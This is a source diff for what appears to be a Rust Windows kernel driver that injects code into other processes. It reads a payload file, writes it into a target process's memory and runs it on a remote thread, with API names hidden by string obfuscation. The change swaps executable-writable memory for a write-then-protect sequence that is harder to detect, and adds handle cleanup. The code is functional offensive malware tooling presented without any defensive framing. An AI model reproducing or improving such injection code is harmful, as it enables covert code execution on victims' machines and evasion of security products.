@@ -2,7 +2,7 @@
 
 use {
     crate::{
-        includes::{MmCopyVirtualMemory, ZwCreateThreadExType}, 
+        includes::{MmCopyVirtualMemory, ZwCreateThreadExType, ZwProtectVirtualMemoryType}, 
         process::Process, 
         utils::{find_zw_function, read_file, InitializeObjectAttributes}
     },
@@ -12,7 +12,7 @@ use {
     obfstr::obfstr, shared::structs::TargetInjection, 
     wdk_sys::{
         ntddk::{
-            IoGetCurrentProcess, ZwAllocateVirtualMemory, ZwOpenProcess
+            IoGetCurrentProcess, ZwAllocateVirtualMemory, ZwOpenProcess, ZwClose
         },
         _MODE::KernelMode, *
     }
@@ -34,6 +34,10 @@ impl Injection {
         let path = &(*target).path;
         let mut h_process: HANDLE = null_mut();
         let zw_thread_addr = match find_zw_function(obfstr!("NtCreateThreadEx")) {
+            Some(addr) => addr as *mut c_void,
+            None => return STATUS_UNSUCCESSFUL
+        };
+        let zw_protect_addr = match find_zw_function(obfstr!("NtProtectVirtualMemory")) {
             Some(addr) => addr as *mut c_void,
             None => return STATUS_UNSUCCESSFUL
         };
@@ -71,14 +75,14 @@ impl Injection {
             0,
             &mut region_size,
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
+            PAGE_READWRITE,
         );
         if !NT_SUCCESS(status) {
             log::error!("ZwAllocateVirtualMemory Failed With Status: {status}");
+            ZwClose(h_process);
             return status;
         }
 
-        // ZwProtectVirtualMemory
         let mut result_number = 0;
         MmCopyVirtualMemory(
             IoGetCurrentProcess(),
@@ -89,6 +93,21 @@ impl Injection {
             KernelMode as i8,
             &mut result_number,
         );
+        
+        let ZwProtectVirtualMemory = core::mem::transmute::<_, ZwProtectVirtualMemoryType>(zw_protect_addr);
+        let mut old_protect = 0;
+        status = ZwProtectVirtualMemory(
+            h_process,
+            &mut base_address,
+            &mut region_size,
+            PAGE_EXECUTE_READ,
+            &mut old_protect
+        );
+        if !NT_SUCCESS(status) {
+            log::error!("ZwProtectVirtualMemory Failed With Status: {status}");
+            ZwClose(h_process);
+            return status;
+        }
 
         let ZwCreateThreadEx = core::mem::transmute::<_, ZwCreateThreadExType>(zw_thread_addr);
         let mut h_thread = null_mut();
@@ -109,8 +128,12 @@ impl Injection {
         );
         if !NT_SUCCESS(status) {
             log::error!("ZwCreateThreadEx Failed With Status: {status}");
+            ZwClose(h_process);
             return status;
         }
+
+        ZwClose(h_process);
+        ZwClose(h_thread);
 
         STATUS_SUCCESS
     }
